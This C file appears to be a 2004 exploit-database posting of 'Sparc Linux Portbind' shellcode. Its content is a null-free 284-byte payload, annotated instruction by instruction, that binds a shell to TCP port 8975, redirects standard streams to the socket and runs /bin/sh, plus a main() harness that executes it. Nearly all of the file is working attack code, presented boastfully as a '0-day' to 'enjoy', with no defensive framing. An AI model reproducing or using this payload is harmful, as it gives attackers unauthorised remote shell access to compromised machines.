/*
 * 0-day portbind shellcode for all those Sun machines running linux..
 * Coded from scratch, so i take all the credits.
 * It simply binds a pretty shell in port 8975/tcp enjoy.
 * no nulls, no fork, no shit, couldn't be more optimized.
 * enjoy!.
 *
 * Arch   : Sparc
 * OS     : Linux
 * Task   : Portbind
 * Length : 284 Bytes
 *
 * Copyright 2002 killah @ hack . gr
 * All rights reserved.
 *
 */

#define NAME "Sparc Linux Portbind"

char portbind[]=
  "\x9d\xe3\xbf\x78"	//	save  %sp, -136, %sp
  "\x90\x10\x20\x02"	//	mov  2, %o0
  "\x92\x10\x20\x01"	//	mov  1, %o1
  "\x94\x22\x80\x0a"	//	sub  %o2, %o2, %o2
  "\xd0\x23\xa0\x44"	//	st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"	//	st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"	//	st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x01"	//	mov  1, %o0
  "\x92\x03\xa0\x44"	//	add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"	//	mov  0xce, %g1
  "\x91\xd0\x20\x10"	//	ta  0x10
  "\xd0\x27\xbf\xf4"	//	st  %o0, [ %fp + -12 ]
  "\x90\x10\x20\x02"	//	mov  2, %o0
  "\xd0\x37\xbf\xd8"	//	sth  %o0, [ %fp + -40 ]
  "\x13\x08\xc8\xc8"	//	sethi  %hi(0x23232000), %o1
  "\x90\x12\x63\x0f"	//	or  %o1, 0x30f, %o0
  "\xd0\x37\xbf\xda"	//	sth  %o0, [ %fp + -38 ]
  "\xc0\x27\xbf\xdc"	//	clr  [ %fp + -36 ]
  "\x92\x07\xbf\xd8"	//	add  %fp, -40, %o1
  "\xd0\x07\xbf\xf4"	//	ld  [ %fp + -12 ], %o0
  "\x94\x10\x20\x10"	//	mov  0x10, %o2
  "\xd0\x23\xa0\x44"	//	st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"	//	st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"	//	st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x02"	//	mov  2, %o0
  "\x92\x03\xa0\x44"	//	add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"	//	mov  0xce, %g1
  "\x91\xd0\x20\x10"	//	ta  0x10
  "\xd0\x07\xbf\xf4"	//	ld  [ %fp + -12 ], %o0
  "\x92\x10\x20\x05"	//	mov  5, %o1
  "\xd0\x23\xa0\x44"	//	st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"	//	st  %o1, [ %sp + 0x48 ]
  "\x90\x10\x20\x04"	//	mov  4, %o0
  "\x92\x03\xa0\x44"	//	add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"	//	mov  0xce, %g1
  "\x91\xd0\x20\x10"	//	ta  0x10
  "\x92\x07\xbf\xd8"	//	add  %fp, -40, %o1
  "\x94\x07\xbf\xec"	//	add  %fp, -20, %o2
  "\xd0\x07\xbf\xf4"	//	ld  [ %fp + -12 ], %o0
  "\xd0\x23\xa0\x44"	//	st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"	//	st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"	//	st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x05"	//	mov  5, %o0
  "\x92\x03\xa0\x44"	//	add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"	//	mov  0xce, %g1
  "\x91\xd0\x20\x10"	//	ta  0x10
  "\xd0\x27\xbf\xf0"	//	st  %o0, [ %fp + -16 ]
  "\xd0\x07\xbf\xf0"	//	ld  [ %fp + -16 ], %o0
  "\x92\x22\x40\x09"	//	sub  %o1, %o1, %o1
  "\x82\x10\x20\x5a"	//	mov  0x5a, %g1
  "\x91\xd0\x20\x10"	//	ta  0x10
  "\xd0\x07\xbf\xf0"	//	ld  [ %fp + -16 ], %o0
  "\x92\x10\x20\x01"	//	mov  1, %o1
  "\x82\x10\x20\x5a"	//	mov  0x5a, %g1
  "\x91\xd0\x20\x10"	//	ta  0x10
  "\xd0\x07\xbf\xf0"	//	ld  [ %fp + -16 ], %o0
  "\x92\x10\x20\x02"	//	mov  2, %o1
  "\x82\x10\x20\x5a"	//	mov  0x5a, %g1
  "\x91\xd0\x20\x10"	//	ta  0x10
  "\x2d\x0b\xd8\x9a"	//	sethi  %hi(0x2f626800), %l6
  "\xac\x15\xa1\x6e"	//	or  %l6, 0x16e, %l6
  "\x2f\x0b\xdc\xda"	//	sethi  %hi(0x2f736800), %l7
  "\x90\x0b\x80\x0e"	//	and  %sp, %sp, %o0
  "\x92\x03\xa0\x08"	//	add  %sp, 8, %o1
  "\x94\x22\x80\x0a"	//	sub  %o2, %o2, %o2
  "\x9c\x03\xa0\x10"	//	add  %sp, 0x10, %sp
  "\xec\x3b\xbf\xf0"	//	std  %l6, [ %sp + -16 ]
  "\xd0\x23\xbf\xf8"	//	st  %o0, [ %sp + -8 ]
  "\xc0\x23\xbf\xfc"	//	clr  [ %sp + -4 ]
  "\x82\x10\x20\x3b"	//	mov  0x3b, %g1
  "\x91\xd0\x20\x10";	//	ta  0x10

int
main() // test that techno-devil!
{
  int (*funct)();
  funct = (int (*)()) portbind;
  printf("%s shellcode\n\tSize = %d\n",NAME,strlen(portbind));
  (int)(*funct)();
  exit(0);
}


/* EOF */

// milw0rm.com [2004-09-12]